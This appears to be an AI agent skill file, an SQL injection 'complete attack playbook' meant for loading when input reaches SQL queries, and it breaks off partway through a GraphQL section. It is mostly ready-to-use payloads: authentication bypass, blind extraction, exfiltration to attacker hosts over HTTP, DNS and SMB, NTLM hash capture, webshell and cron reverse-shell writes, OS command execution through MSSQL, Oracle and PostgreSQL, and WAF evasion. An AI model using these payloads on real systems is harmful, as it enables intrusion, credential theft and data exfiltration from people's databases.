---
name: injection-sqli
description: >-
  SQL injection complete playbook. Covers multi-DB exploitation (MySQL/PostgreSQL/MSSQL/Oracle/SQLite/DB2/Cassandra/BigQuery), blind techniques (time-based per-DB/boolean/error-based/OOB), WAF bypass matrix, advanced sqlmap workflows (tamper scripts/second-order/OS shell), HANDLER bypass, innodb_table_stats filter evasion, and NTLM hash exfil via xp_dirtree. Load when input reaches SQL queries.
---

<!-- src: hacker/.claude/skills/injection-sqli/SKILL.md -->

# SQL Injection — Complete Attack Playbook

> Advanced SQLi techniques covering per-database exploitation, out-of-band exfiltration, second-order injection, parameterized query bypass scenarios, filter evasion, escalation to OS, INSERT/UPDATE/DELETE patterns, GraphQL+SQLi, and CTF-oriented tricks.

---

## Internal Navigation

1. [Detection & Quick Start](#1-detection--quick-start)
2. [Database Fingerprinting](#2-database-fingerprinting)
3. [UNION-Based Data Extraction](#3-union-based-data-extraction)
4. [Blind Injection — Inference Techniques](#4-blind-injection--inference-techniques)
5. [Out-of-Band (OOB) Exfiltration](#5-out-of-band-oob-exfiltration)
6. [Escalation — OS Command Execution](#6-escalation--os-command-execution)
7. [Second-Order Injection](#7-second-order-injection)
8. [Parameterized Query Bypass Scenarios](#8-parameterized-query-bypass-scenarios)
9. [Filter Evasion Techniques](#9-filter-evasion-techniques)
10. [Database Metadata Extraction](#10-database-metadata-extraction)
11. [Stored Procedure Abuse](#11-stored-procedure-abuse)
12. [WAF Bypass Matrix](#12-waf-bypass-matrix)
13. [DB-Specific: DB2](#13-db-specific-db2)
14. [DB-Specific: Cassandra (CQL)](#14-db-specific-cassandra-cql)
15. [DB-Specific: BigQuery](#15-db-specific-bigquery)
16. [DB-Specific: SQLite — Injection to RCE](#16-db-specific-sqlite--injection-to-rce)
17. [DB-Specific: PostgreSQL — Advanced](#17-db-specific-postgresql--advanced)
18. [DB-Specific: MSSQL — Advanced](#18-db-specific-mssql--advanced)
19. [DB-Specific: Oracle — Advanced](#19-db-specific-oracle--advanced)
20. [DB-Specific: MySQL — Advanced](#20-db-specific-mysql--advanced)
21. [Extended Scenarios & Real-World Cases](#21-extended-scenarios--real-world-cases)
22. [INSERT / UPDATE / DELETE Injection Patterns](#22-insert--update--delete-injection-patterns)
23. [GraphQL + SQL Injection](#23-graphql--sql-injection)
24. [CTF-Oriented Techniques](#24-ctf-oriented-techniques)
25. [SQLMap — Advanced Workflow](#25-sqlmap--advanced-workflow)
26. [WAF Bypass — Advanced Tamper Chain Patterns](#26-waf-bypass--advanced-tamper-chain-patterns)
27. [Quick Reference — Injection Test Strings](#27-quick-reference--injection-test-strings)

---

## 0. RELATED ROUTING

- [ghost-bits-cast-attack](../ghost-bits-cast-attack/SKILL.md) when the backend is **Java with Jackson** and your SQL keywords are WAF-blocked — Jackson's `charToHex` table is indexed by `ch & 0xFF`, so a Unicode character like `丰` (U+4E30) resolves to hex digit `0` inside a `\uXXXX` escape sequence, letting you smuggle `UNION`, `SELECT`, `1`, etc. without the WAF ever seeing them

---

## 1. DETECTION & QUICK START

### First-pass payload families

| Situation | Start With | Why |
|---|---|---|
| Login or boolean branch | `' or 1=1--` | Fast signal on auth or conditional checks |
| Numeric parameter | `1 or 1=1` | Avoid quote dependency |
| ORDER BY / sorting | `1,2,3` then `1 desc--` | Good for structural probing |
| Visible SQL errors | `'` then DBMS-specific error probes | Error text gives DBMS clues |
| No visible output | time-based payloads | Stable fallback for blind targets |
| Heavy filtering / WAF | polyglot or whitespace-free variants | Expands parser confusion surface |

### Small, stable first-pass set

```text
'
' or 1=1--
' or '1'='1'--
1 or 1=1
') or ('1'='1
'; WAITFOR DELAY '0:0:5'--
' AND SLEEP(5)--
'||(SELECT pg_sleep(5))--
1 AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)
' order by 1--
' union select null--
```

### DBMS routing hints

| Clue | Likely DBMS | Good Next Move |
|---|---|---|
| `You have an error in your SQL syntax` | MySQL | try `SLEEP()` and `@@version` |
| `Microsoft OLE DB Provider` | MSSQL | try `WAITFOR DELAY` |
| `PG::` / `PostgreSQL` | PostgreSQL | try `pg_sleep()` |
| `ORA-` prefix | Oracle | pivot to out-of-band or XML features |
| SQLite errors, local apps | SQLite | focus on boolean/UNION and file-backed behavior |

### Subtle detection indicators

Most SQLi is found by **behavioral differences**, not errors:

| Signal | Meaning |
|---|---|
| Page loads differently with `'` vs `''` | String context injection point |
| Numeric: `1` vs `1-1` vs `2-1` returns same | Arithmetic evaluated |
| `1=1` vs `1=2` in condition changes result | Boolean-based injection |
| SELECT with ORDER BY N: column count enumeration | UNION prep |
| Time delay: `'; WAITFOR DELAY '0:0:5'--` | Blind/time-based |
| 500 error on `'`, 200 on `''` | Unhandled exception = SQLi |
| Different HTTP response size | Boolean blind indicator |

**Critical**: test in ALL parameter types — URL query, POST body, JSON fields, XML values, HTTP headers (X-Forwarded-For, User-Agent, Referer, Cookie values).

---

## 2. DATABASE FINGERPRINTING

```sql
-- MySQL
VERSION()              -- returns version string
@@datadir              -- data directory
@@global.secure_file_priv  -- file read restriction

-- MSSQL
@@VERSION              -- includes "Microsoft SQL Server"
DB_NAME()              -- current database
USER_NAME()            -- current user

-- Oracle
v$version              -- SELECT banner FROM v$version WHERE ROWNUM=1
sys.database_name      -- current db (alternative)
user                   -- current Oracle user

-- PostgreSQL
version()              -- returns version
current_database()     -- current db
current_user           -- current user
```

**Error-based fingerprint**: inject `'` and read error message format. MySQL errors differ from Oracle/MSSQL.

---

## 3. UNION-BASED DATA EXTRACTION

**Column count determination**:
```sql
ORDER BY 1--
ORDER BY 2--
ORDER BY N--   ← until error = N-1 columns
```

**Column type detection** (NULL is safest):
```sql
UNION SELECT NULL,NULL,NULL--
UNION SELECT 'a',NULL,NULL--  ← find string column
```

**Database-specific string concat** (required when column accepts only int):
```sql
-- MySQL
CONCAT(username,0x3a,password)

-- MSSQL
username+'|'+password

-- Oracle
username||'|'||password

-- PostgreSQL
username||':'||password
```

---

## 4. BLIND INJECTION — INFERENCE TECHNIQUES

### Boolean Blind (conditional response difference)
```sql
-- Does first char of username = 'a'?
' AND SUBSTRING(username,1,1)='a'--
' AND ASCII(SUBSTRING(username,1,1))>96--

-- Oracle
' AND SUBSTR((SELECT username FROM users WHERE rownum=1),1,1)='a'--

-- MSSQL
' AND SUBSTRING((SELECT TOP 1 username FROM users),1,1)='a'--
```

### Time-Based Blind (no response difference)
```sql
-- MSSQL (most reliable)
'; IF (SUBSTRING(username,1,1)='a') WAITFOR DELAY '0:0:5'--

-- MySQL
' AND IF(SUBSTRING(username,1,1)='a',SLEEP(5),0)--

-- Oracle
' AND 1=(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '1' END FROM dual)--
-- Oracle sleep alternative (no SLEEP):
' AND 1=UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT user FROM dual))--

-- PostgreSQL
'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--
```

---

## 5. OUT-OF-BAND (OOB) EXFILTRATION

Use when blind injection has no time/boolean indicator, or when batch queries can't return data inline.

### MSSQL — OpenRowSet (requires SQLOLEDB, outbound TCP)
```sql
'; INSERT INTO OPENROWSET(
  'SQLOLEDB',
  'DRIVER={SQL Server};SERVER=attacker.com,80;UID=sa;PWD=pass',
  'SELECT * FROM foo'
) VALUES (@@version)--

-- Exfiltrate table data:
'; INSERT INTO OPENROWSET(
  'SQLOLEDB',
  'DRIVER={SQL Server};SERVER=attacker.com,80;UID=sa;PWD=pass',
  'SELECT * FROM foo'
) SELECT TOP 1 username+':'+password FROM users--
```
Use **port 80 or 443** to bypass firewall egress restrictions.

### Oracle — UTL_HTTP (HTTP GET with data in URL path)
```sql
'+UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT username FROM all_users WHERE ROWNUM=1))--
```
Oracle's UTL_HTTP supports proxy — can exfil through corporate proxy!

### Oracle — UTL_INADDR (DNS exfiltration — often bypasses HTTP restrictions)
```sql
'+UTL_INADDR.GET_HOST_NAME((SELECT password FROM dba_users WHERE username='SYS')||'.attacker.com')--
```
Attacker sees: `HASH_VALUE.attacker.com` DNS query → read password hash.

### Oracle — UTL_SMTP / UTL_TCP
```sql
-- Email large data dumps:
UTL_SMTP.SENDMAIL(...)  -- send query results via email

-- Raw TCP socket:
UTL_TCP.OPEN_CONNECTION('attacker.com', 80)
```

### MySQL — DNS via LOAD_FILE (Windows + UNC path)
```sql
SELECT LOAD_FILE('\\\\attacker.com\\share')
-- Triggers DNS lookup before connection attempt
-- Works on Windows hosts with outbound SMB
```

### MySQL — INTO OUTFILE (in-band filesystem write)
```sql
SELECT "<?php system($_GET['c']); ?>" INTO OUTFILE '/var/www/html/shell.php'
-- Requirements: FILE privilege, writable web root, secure_file_priv=''
```

### MySQL — SMB Out-of-Band Exfiltration (Windows)

When the MySQL server runs on Windows with outbound SMB allowed:

```sql
SELECT LOAD_FILE(CONCAT('\\\\', (SELECT user()), '.attacker.com\\share'));
-- Triggers SMB connection → DNS lookup with data in hostname

-- More complete:
SELECT LOAD_FILE(CONCAT('\\\\attacker-ip\\', user(), '\\l.txt'));
-- SMB authentication attempt → attacker captures NTLMv2 hash via Responder
```

**Compared to DNS exfiltration**: SMB exfil can also leak NTLM hashes, enabling offline password cracking. DNS exfil is more reliable across firewalls.

---

## 6. ESCALATION — OS COMMAND EXECUTION

### MSSQL — xp_cmdshell (if enabled, or if sysadmin)
```sql
'; EXEC xp_cmdshell('whoami')--

-- Enable if disabled (requires sysadmin):
'; EXEC sp_configure 'show advanced options',1; RECONFIGURE--
'; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE--
```

### MySQL — UDF (User Defined Functions)
Write malicious shared library to filesystem, then `CREATE FUNCTION ... SONAME`.

### Oracle — Java Stored Procedures
```sql
-- Create Java class:
EXEC dbms_java.grant_permission('SCOTT','SYS:java.io.FilePermission','<<ALL FILES>>','execute');
-- Then exec OS commands via Java Runtime
```

---

## 7. SECOND-ORDER INJECTION

**Concept**: User input is stored safely (parameterized), but later **retrieved as trusted data** and concatenated into a new query without re-sanitization.

**Example attack flow**:
1. Register username: `admin'--`
2. Application safely inserts this into users table
3. Password change function fetches username from session (trusted!) and builds:
   ```sql
   UPDATE users SET password='newpass' WHERE username='admin'--'
   ```
4. Comment strips the condition → updates **admin's** password

**Key insight**: Any application function that reads stored data and uses it in a new DB query is a second-order candidate. Review: password change, profile update, admin action on user data.

---

## 8. PARAMETERIZED QUERY BYPASS SCENARIOS

Parameterized queries do NOT prevent SQLi when:

1. **Table/column names are user-controlled** — params can't parameterize identifiers:
   ```sql
   -- UNSAFE even with params:
   "SELECT * FROM " + tableName + " WHERE id = ?"
   ```
   Mitigation: whitelist-validate table/column names.

2. **Partial parameterization** — some fields concatenated, others parameterized:
   ```sql
   "SELECT * FROM users WHERE type='" + userType + "' AND id=?"
   -- userType not parameterized → injection
   ```

3. **IN clause** with dynamic count (common mistake in ORMs):
   ```sql
   SELECT * FROM items WHERE id IN (1, 2, ?)  -- only last is parameterized
   ```

4. **Second-order** — data retrieved from DB assumed clean, re-used in query without params.

### PDO / Prepared Statement Edge Cases
```php
// Unsafe even with PDO when query structure is dynamic:
$pdo->query("SELECT * FROM " . $_GET['table']);
// Or when using emulated prepares with multi-query:
$pdo->setAttribute(PDO::ATTR_EMULATE_PREPARES, true);
```

---

## 9. FILTER EVASION TECHNIQUES

### Comment Injection (break keywords)
```sql
SEL/**/ECT
UN/**/ION
1 UN/**/ION ALL SEL/**/ECT NULL--
```

### Case Variation
```sql
UnIoN SeLeCt
```

### URL Encoding
```sql
%55NION  -- U
%53ELECT -- S
```

### Whitespace Alternatives
```sql
SELECT/**/username/**/FROM/**/users
SELECT%09username%09FROM%09users  -- tab
SELECT%0ausername%0aFROM%0ausers  -- newline
```

### String Construction (bypass literal-string detection)
```sql
-- MySQL concatenation without quotes:
CHAR(117,115,101,114,110,97,109,101)  -- 'username'

-- Oracle:
CHR(117)||CHR(115)||CHR(101)||CHR(114)

-- MSSQL:
CHAR(117)+CHAR(115)+CHAR(101)+CHAR(114)
```

### Entry Point Detection (Unicode tricks)
```
U+02BA ʺ (modifier letter double prime) → "
U+02B9 ʹ (modifier letter prime) → '
%%2727 → %27 → '
```

---

## 10. DATABASE METADATA EXTRACTION

### MySQL
```sql
SELECT schema_name FROM information_schema.schemata
SELECT table_name FROM information_schema.tables WHERE table_schema=database()
SELECT column_name FROM information_schema.columns WHERE table_name='users'
```

### MSSQL
```sql
SELECT name FROM master..sysdatabases
SELECT name FROM sysobjects WHERE xtype='U'  -- user tables
SELECT name FROM syscolumns WHERE id=OBJECT_ID('users')
```

### Oracle
```sql
SELECT owner,table_name FROM all_tables
SELECT column_name FROM all_tab_columns WHERE table_name='USERS'
SELECT username,password FROM dba_users  -- requires DBA
```

### PostgreSQL
```sql
SELECT datname FROM pg_database
SELECT tablename FROM pg_tables WHERE schemaname='public'
SELECT column_name FROM information_schema.columns WHERE table_name='users'
```

---

## 11. STORED PROCEDURE ABUSE

### MSSQL — sp_OAMethod (COM automation)
```sql
DECLARE @o INT
EXEC sp_OACreate 'wscript.shell', @o OUT
EXEC sp_OAMethod @o, 'run', NULL, 'cmd.exe /c whoami > C:\out.txt'
```

### Oracle — DBMS_LDAP (outbound LDAP = DNS exfil)
```sql
SELECT DBMS_LDAP.INIT((SELECT password FROM dba_users WHERE username='SYS')||'.attacker.com',389) FROM dual
```

---

## 12. WAF BYPASS MATRIX

| Technique | Blocked | Bypass |
|---|---|---|
| Space filtered | `SELECT * FROM` | `SELECT/**/*//**/FROM`, `SELECT%0a*%0aFROM` |
| Comma filtered | `UNION SELECT 1,2,3` | `UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c` |
| Quote filtered | `'admin'` | `0x61646D696E` (hex), `CHAR(97,100,109,105,110)` |
| OR/AND filtered | `OR 1=1` | `||1=1`, `&&1=1`, `DIV 0` |
| = filtered | `id=1` | `id LIKE 1`, `id REGEXP '^1$'`, `id IN (1)`, `id BETWEEN 1 AND 1` |
| SELECT filtered | | Use `handler` (MySQL), `PREPARE`+hex, or stacked queries |
| information_schema filtered | | `mysql.innodb_table_stats`, `sys.schema_table_statistics` |

### No-Space Bypass
```sql
SELECT/**/username/**/FROM/**/users
SELECT(username)FROM(users)
UNION%09SELECT%091,2,3     -- tab character
UNION%0BSELECT%0B1,2,3    -- vertical tab
UNION(SELECT(1),(2),(3))   -- parentheses instead of spaces
```

### No-Comma Bypass
```sql
-- UNION with JOIN instead of comma:
UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c
-- SUBSTRING alternative: SUBSTRING('abc' FROM 1 FOR 1)
-- LIMIT alternative: LIMIT 1 OFFSET 0
-- CASE/JOIN substitution
SELECT CASE WHEN 1=1 THEN 1 END FROM dual
```

### Polyglot Injection
```sql
SLEEP(1)/*' or SLEEP(1) or '" or SLEEP(1) or "*/
```

### Routed Injection
```sql
-- First query returns string used as input to second query:
' UNION SELECT CONCAT(0x222c,(SELECT password FROM users LIMIT 1))--
-- Nested query where inner result becomes part of outer:
1' UNION SELECT 0x2720554e494f4e2053454c454354 -- (hex-encoded second stage)
```

Additional WAF bypass patterns:

- Second Order: inject into storage, trigger when data is used in another query later
- PDO emulated prepare: when `PDO::ATTR_EMULATE_PREPARES=true`, stacked queries work even with parameterized-looking code

---

## 13. DB-SPECIFIC: DB2

DB2 uses distinct syntax and system tables.

### Enumeration
```sql
SELECT versionnumber, version_timestamp FROM sysibm.sysversions
SELECT schemaname FROM syscat.schemata
SELECT inst_name FROM sysibmadm.env_inst_info
SELECT 1 FROM sysibm.sysdummy1   -- equivalent to Oracle DUAL
SELECT user FROM sysibm.sysdummy1
SELECT name, tbname FROM sysibm.syscolumns WHERE tbname='USERS'
```

### Blind Injection
```sql
-- Character extraction:
AND ascii(substr((SELECT user FROM sysibm.sysdummy1),1,1)) > 64

-- Row selection (no LIMIT):
SELECT column FROM table FETCH FIRST 1 ROWS ONLY

-- CASE-based boolean:
SELECT CASE WHEN (1=1) THEN 'a' ELSE 'b' END FROM sysibm.sysdummy1

-- Time-based via Cartesian product (no SLEEP):
AND 1=(SELECT COUNT(*) FROM sysibm.sysdummy1 a, sysibm.sysdummy1 b, sysibm.sysdummy1 c)
SELECT count(*) FROM sysibm.columns t1, sysibm.columns t2, sysibm.columns t3
```

### Command Execution
```sql
-- IBM i (AS/400) only:
CALL QSYS2.QCMDEXC('COMMAND_HERE')
```

### WAF Bypass
```sql
-- Avoid quotes via chr() concatenation:
chr(65)||chr(68)||chr(77)||chr(73)||chr(78)   -- 'ADMIN'
```

---

## 14. DB-SPECIFIC: CASSANDRA (CQL)

Cassandra Query Language has severe limitations for injection:

### Key Limitations
- No JOIN, no UNION, no subqueries
- No `OR` operator in WHERE clause
- No `SLEEP()` or time-delay function
- No built-in `USER()` function
- Comments: `/* ... */` only (no single-line comment syntax)

### Authentication Bypass
```sql
-- Null byte termination:
admin' ALLOW FILTERING; %00

-- Multi-line comment closure:
admin'/*    (in username)
*/and pass>'  (in password)
```

### Boolean Extraction
```sql
SELECT * FROM users WHERE user='admin' IF EXISTS
```

---

## 15. DB-SPECIFIC: BIGQUERY

Google BigQuery uses backtick-quoted identifiers and lacks traditional blind techniques.

### Identification
```sql
-- Backtick syntax is distinctive:
SELECT * FROM `project.dataset.table`

-- System variables:
SELECT @@project_id
```

### Enumeration
```sql
SELECT schema_name FROM INFORMATION_SCHEMA.SCHEMATA
-- Fully qualified table names required: project.dataset.table
SELECT * FROM `project.dataset.INFORMATION_SCHEMA.TABLES`
```

### Error-based
```sql
-- Division by zero:
' OR if(1/(length((select('a')))-1)=1,true,false) OR '
```

### Boolean Blind
```sql
' AND SUBSTRING((SELECT schema_name FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 1),1,1)='A' --
```

### UNION Template
```sql
' UNION ALL SELECT (SELECT @@project_id),2,3--
```

### Key Notes
- No native `SLEEP()` function for time-based blind
- Comments: `#`, `/* */`
- No stacked queries support

---

## 16. DB-SPECIFIC: SQLITE — INJECTION TO RCE

SQLite supports file operations that can escalate to code execution.

### Enumeration
```sql
SELECT name FROM sqlite_master WHERE type='table'
SELECT sql FROM sqlite_master WHERE name='target_table'
SELECT * FROM pragma_table_info('target_table')
```

### Blind Injection
```sql
SELECT CASE WHEN (1=1) THEN 'a' ELSE 'b' END
-- Hex-based character extraction:
SELECT hex(substr(password,1,1)) FROM users LIMIT 1
```

### Error-based
```sql
-- Trigger error via nonexistent function:
CASE WHEN [condition] THEN 1 ELSE load_extension(1) END
```

### Time-based (no SLEEP)
```sql
-- CPU-intensive operation as delay:
AND 1=LIKE('ABCDEFG', UPPER(HEX(RANDOMBLOB(500000000/2))))
```

### Write Webshell via ATTACH DATABASE
```sql
ATTACH DATABASE '/var/www/html/shell.php' AS pwn;
CREATE TABLE pwn.cmd (payload text);
INSERT INTO pwn.cmd VALUES ('<?php system($_GET["c"]); ?>');
```

### Write Cron Job
```sql
ATTACH DATABASE '/var/spool/cron/crontabs/www-data' AS cron;
CREATE TABLE cron.job (payload text);
INSERT INTO cron.job VALUES ('* * * * * /bin/bash -c "bash -i >& /dev/tcp/ATTACKER/4444 0>&1"');
```

### load_extension (if enabled)
```sql
-- Load shared library for RCE (rarely enabled):
SELECT load_extension('/tmp/evil.so')
-- Windows UNC path variant:
SELECT load_extension('\\attacker\share\evil.dll')
```

### writefile (if available)
```sql
SELECT writefile('/var/www/html/shell.php', '<?php system($_GET["c"]); ?>');
```

### GLOB-based blind (alternative to LIKE)
```sql
SELECT * FROM users WHERE password GLOB 'a*';
```

---

## 17. DB-SPECIFIC: POSTGRESQL — ADVANCED

### Dollar-Sign Quoting (bypass quote filters entirely)
```sql
-- Standard quoting (blocked by WAF):
SELECT 'admin'

-- Dollar-sign quoting (same result, no single quotes):
SELECT $$admin$$

-- Tagged dollar quoting:
SELECT $tag$admin$tag$

-- In injection context:
' UNION SELECT $$test$$,version()--

-- Dynamic SQL execution without quotes:
SELECT $$ALTER USER postgres PASSWORD 'newpass'$$::text;
```

### COPY Command for File I/O
```sql
-- Read file:
CREATE TEMP TABLE tmp(content text);
COPY tmp FROM $$/etc/passwd$$;
SELECT * FROM tmp;

-- Write file (webshell):
COPY (SELECT $$<?php system($_GET['c']); ?>$$) TO $$/var/www/html/shell.php$$;
```

### Large Object for Binary I/O
```sql
SELECT lo_import($$/etc/passwd$$, 1337);
SELECT lo_get(1337);
```

### PL/pgSQL Command Execution (if CREATE LANGUAGE available)
```sql
CREATE OR REPLACE FUNCTION cmd(text) RETURNS text AS $$
BEGIN
  RETURN (SELECT cmd_output FROM sys_exec($1));
END;
$$ LANGUAGE plpgsql;
```

---

## 18. DB-SPECIFIC: MSSQL — ADVANCED

### Linked Servers (pivot through trust relationships)
```sql
-- Enumerate linked servers:
SELECT * FROM master..sysservers;
EXEC sp_linkedservers;

-- Query a linked server:
SELECT * FROM OPENQUERY(LINKED_SRV, 'SELECT @@version');

-- Execute on linked server:
EXEC ('xp_cmdshell ''whoami''') AT [LINKED_SRV];

-- Nested (double-hop) through two linked servers:
EXEC ('EXEC (''xp_cmdshell ''''whoami'''''') AT [LINKED_SRV_2]') AT [LINKED_SRV_1];
```

### NTLM Hash Credential Harvesting via xp_dirtree
```sql
-- Capture NTLM hash via UNC path:
EXEC master..xp_dirtree '\\ATTACKER_IP\share';

-- xp_subdirs alternative:
EXEC master..xp_subdirs '\\ATTACKER_IP\share';

-- Run Responder/Inveigh on attacker to capture NTLMv2 hash
```

### CLR Assembly for Full .NET Execution
```sql
-- Requires sysadmin or ALTER ASSEMBLY permission
CREATE ASSEMBLY malicious FROM 0x4D5A... WITH PERMISSION_SET = UNSAFE;
CREATE PROCEDURE [dbo].[cmd_exec] @cmd NVARCHAR(4000) AS EXTERNAL NAME [malicious].[StoredProcedures].[cmd_exec];
EXEC cmd_exec 'whoami';
```

### Agent Jobs (alternate command execution path)
```sql
USE msdb;
EXEC dbo.sp_add_job @job_name = 'pwn';
EXEC sp_add_jobstep @job_name='pwn', @step_name='run',
  @subsystem='CmdExec', @command='whoami > C:\out.txt';
EXEC sp_add_jobserver @job_name='pwn';
EXEC sp_start_job @job_name='pwn';
```

---

## 19. DB-SPECIFIC: ORACLE — ADVANCED

### DBMS_PIPE and DBMS_LOCK (time-based blind)
```sql
-- Time-based blind via DBMS_PIPE.RECEIVE_MESSAGE:
' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a', 5)--
-- Waits 5 seconds; works where SLEEP() doesn't exist

-- DBMS_LOCK.SLEEP (if DBMS_PIPE is blocked):
' AND 1=DBMS_LOCK.SLEEP(5)--

-- Heavy query time-based (no special priv):
' AND 1=(SELECT COUNT(*) FROM all_objects a, all_objects b)--
```

### DBMS_SCHEDULER for OS Commands
```sql
BEGIN
  DBMS_SCHEDULER.CREATE_JOB(
    job_name   => 'pwn',
    job_type   => 'EXECUTABLE',
    job_action => '/bin/bash',
    number_of_arguments => 2,
    enabled    => FALSE
  );
  DBMS_SCHEDULER.SET_JOB_ARGUMENT_VALUE('pwn', 1, '-c');
  DBMS_SCHEDULER.SET_JOB_ARGUMENT_VALUE('pwn', 2, 'curl http://ATTACKER/$(whoami)');
  DBMS_SCHEDULER.ENABLE('pwn');
END;
```

### XXE via XMLTYPE (out-of-band exfiltration)
```sql
SELECT XMLTYPE('<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://ATTACKER/'||(SELECT user FROM dual)||'">]><foo>&xxe;</foo>') FROM dual;
```

### DBMS_JAVA for OS Command via Java
```sql
SELECT DBMS_JAVA.RUNJAVA('oracle/aurora/util/Wrapper /bin/bash -c "curl http://ATTACKER/$(id)"') FROM dual;
```

---

## 20. DB-SPECIFIC: MYSQL — ADVANCED

### Handler Command (bypass SELECT keyword filters)
```sql
HANDLER users OPEN;
HANDLER users READ FIRST;
HANDLER users CLOSE;
```

### Prepared Statement via Hex (bypass keyword filters)
```sql
SET @q=0x53454C454354202A2046524F4D207573657273; -- SELECT * FROM users
PREPARE stmt FROM @q;
EXECUTE stmt;
```

### mysql.innodb_table_stats (bypass information_schema filters)
```sql
SELECT database_name, table_name FROM mysql.innodb_table_stats;
```

### sys Schema (MySQL 5.7+, bypass information_schema filters)
```sql
SELECT table_name FROM sys.schema_table_statistics WHERE table_schema=database();
SELECT table_name FROM sys.x$schema_table_statistics;
```

### Dumpfile (binary-safe single-row write)
```sql
SELECT 0x3C3F706870... INTO DUMPFILE '/var/www/html/shell.php';
```

---

## 21. EXTENDED SCENARIOS & REAL-WORLD CASES

### KEY Injection / URI Injection

Beyond GET/POST parameters, SQL injection may occur in less-tested locations:

| Injection Point | Example |
|---|---|
| JSON key names | `{"admin' OR 1=1--": "value"}` — if key is used in column name |
| URI path segments | `/api/users/1 OR 1=1` — if path param enters SQL |
| HTTP headers | `X-Forwarded-For: 127.0.0.1' OR 1=1--` |
| Cookie values | `session=abc' UNION SELECT...` |
| Multipart filename | `filename="test' OR '1'='1.jpg"` |
| ORDER BY from API sort param | `?sort=name; DROP TABLE--` |

### SQL Injection via Different SQL Verbs

Applications may use different HTTP methods and SQL verbs for the same endpoint:

```text
GET  /api/items?id=1      → SELECT (read)
POST /api/items            → INSERT (create)
PUT  /api/items/1          → UPDATE (modify)
DELETE /api/items/1        → DELETE (remove)

Each verb constructs a different SQL statement.
Test ALL verbs, not just the one shown in the UI.
```

### Universal Password Bypass Patterns

```sql
-- Standard:
admin'--
admin' OR 1=1--
' OR '1'='1

-- With parentheses (common in PHP apps):
') OR ('1'='1
') OR 1=1--

-- With comment variations:
admin'/*
admin' OR 1=1#

-- Without quotes (numeric context):
1 OR 1=1
0 OR 1=1
```

### CVE Case: ThinkPHP5 SQL Injection

ThinkPHP5 framework's `where` method improperly handles array parameters:

```
POST /index/think\app/invokefunction
Content-Type: application/x-www-form-urlencoded

function=call_user_func_array&vars[0]=system&vars[1][]=id
```

Error-based extraction using `updatexml`:
```sql
id=1' AND updatexml(1, concat(0x7e, (SELECT user()), 0x7e), 1)--
```

### CVE Case: Django GIS SQL Injection (CVE-2020-9402)

Django's GIS `GeoQuerySet` methods on Oracle backend allow error-based injection via `utl_inaddr.get_host_name`:

```sql
-- Oracle error-based exfiltration:
' AND 1=utl_inaddr.get_host_name((SELECT user FROM dual))--
-- Oracle raises ORA-29257 containing the username in the error message

-- DNS-based out-of-band on Oracle:
' AND 1=UTL_INADDR.GET_HOST_NAME((SELECT password FROM dba_users WHERE username='SYS')||'.attacker.com')--
```

**Takeaway**: Oracle-specific functions (`utl_inaddr`, `utl_http`, `dbms_ldap`) are powerful OOB channels that bypass most firewall restrictions.

---

## 22. INSERT / UPDATE / DELETE INJECTION PATTERNS

### INSERT Statement Injection

```sql
-- Original: INSERT INTO logs (user, action) VALUES ('INPUT', 'login');
-- Injection in user field:
INPUT: admin', 'login'), ('attacker', (SELECT password FROM users LIMIT 1))--
-- Result: INSERT INTO logs (user, action) VALUES ('admin', 'login'), ('attacker', 'actual_password')--', 'login');
-- Exfiltrates data into a visible log table
```

**Data exfiltration via INSERT** (when you can see the inserted row):

```sql
-- MySQL: inject subquery into visible column
INPUT: test',(SELECT password FROM users LIMIT 1))-- -
-- Result:
INSERT INTO logs (user, action) VALUES ('test',(SELECT password FROM users LIMIT 1))-- -', 'login');

-- Oracle: requires FROM dual in subquery
INPUT: test'||(SELECT username FROM all_users WHERE ROWNUM=1)||'
```

**Blind INSERT exfiltration** (cannot see the row):

```sql
-- Time-based: inject IF into a column
INPUT: test' AND IF((SELECT SUBSTRING(password,1,1) FROM users LIMIT 1)='a', SLEEP(5), 0) AND '1'='1
```

### UPDATE Statement Injection

```sql
-- Original: UPDATE users SET email='INPUT' WHERE id=1;

-- Overwrite another column:
INPUT: attacker@evil.com', is_admin='1
-- Result: UPDATE users SET email='attacker@evil.com', is_admin='1' WHERE id=1;

-- Overwrite WHERE clause (escalate to all rows):
INPUT: anything' WHERE 1=1;--
-- Result: UPDATE users SET email='anything' WHERE 1=1;--' WHERE id=1;
```

**Subquery data extraction in UPDATE**:

```sql
-- Extract data into a column you can read:
INPUT: '||(SELECT password FROM users WHERE username='admin')||'
-- Result (PostgreSQL):
UPDATE profile SET bio=''||(SELECT password FROM users WHERE username='admin')||'' WHERE id=1;
-- bio now contains admin's password hash
```

### DELETE Statement Injection

```sql
-- Original: DELETE FROM sessions WHERE token='INPUT';

-- Widen scope (dangerous):
INPUT: ' OR '1'='1
-- Result: DELETE FROM sessions WHERE token='' OR '1'='1';
-- Deletes ALL sessions

-- Data exfiltration via time-based blind in DELETE:
INPUT: ' OR IF((SELECT SUBSTRING(password,1,1) FROM users LIMIT 1)='a', SLEEP(5), 0) OR '
```

### SQLMap for INSERT/UPDATE/DELETE

```bash
# SQLMap can test non-SELECT statements with stacked queries:
sqlmap -u "$URL" --data="email=test@test.com" --technique=BST --risk=3 --level=3

# --risk=3 is needed: enables OR-based payloads used in UPDATE/DELETE contexts
# Use --string or --not-string to identify success/failure responses
```

---

## 23. GRAPHQL + SQL INJECTION

### Batched Query Injection

GraphQL supports batched queries in a single HTTP request — each may hit different resolvers with different SQL backends:

```json
[
  {"query": "{ user(id: \"1 OR 1=1--\") { name email } }"},
  {"query": "{ product(id: \"1 UNION SELECT username,password FROM users--\") { title } }"}
]
```

### Nested Field Injection

GraphQL resolvers often build SQL from nested field arguments:

```graphql
{
  users(where: {name: "admin' OR '1'='1"}) {
    id
    email
    posts(orderBy: "created_at; DROP TABLE posts--") {
      title
    }
  }
}
```

**Argument-level injection points**:

```graphql
# filter / where argument
{ users(filter: {email_contains: "' OR 1=1--"}) { id } }

# orderBy / sortBy
